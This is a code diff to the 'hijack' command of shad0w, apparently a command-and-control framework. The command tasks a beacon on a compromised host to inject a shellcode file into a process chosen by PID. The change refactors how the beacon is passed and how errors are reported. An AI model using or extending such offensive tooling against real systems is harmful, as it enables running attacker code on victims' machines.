@@ -14,6 +14,12 @@ from lib.basecommand import BaseCommand
 
 SHINJECT_EXEC_ID = 0x2000
 
+# beacon to exec command on
+current_beacon = None
+
+def hijack_callback(shad0w, data):
+    # wont be hit
+    return
 
 def build_inject_info(args, rcode):
     # create the json object to tell the beacon
@@ -44,8 +50,10 @@ def get_file_data(filename):
 
 
 class HijackCommand(BaseCommand):
-    def __init__(self, args):
+    def __init__(self, args, beacon):
         BaseCommand.__init__(self, "hijack", args)
+
+        self.beacon = beacon
 
     def parse_parameters(self):
         self.parser.add_argument("-p", "--pid", required=True, help="PID of the process")
@@ -62,21 +70,21 @@ hijack -p 4267 -f shellcode.bin
     def run(self, shad0w):
         rcode = get_file_data(self.args.file)
         if rcode is None:
-            shad0w.debug.error(f"Shellcode file '{self.args.file}' does not exist")
+            shad0w.event.beacon_info(current_beacon, f"Shellcode file '{self.args.file}' does not exist")
             return
 
         inject_info = build_inject_info(self.args, rcode)
 
-        shad0w.beacons[shad0w.current_beacon]["task"] = (SHINJECT_EXEC_ID, inject_info)
+        shad0w.beacons[self.beacon]["task"] = (SHINJECT_EXEC_ID, inject_info)
+        shad0w.beacons[self.beacon]["callback"] = hijack_callback
 
+def main(shad0w, args, beacon):
+    global current_beacon
 
-def main(shad0w, args):
-    # check we actually have a beacon
-    if shad0w.current_beacon is None:
-        shad0w.debug.log("ERROR: No active beacon", log=True)
-        return
+    # make beacon global
+    current_beacon = beacon
 
-    cmd = HijackCommand(args)
+    cmd = HijackCommand(args, beacon)
     if cmd.parse() is True:
         cmd.run(shad0w)
 
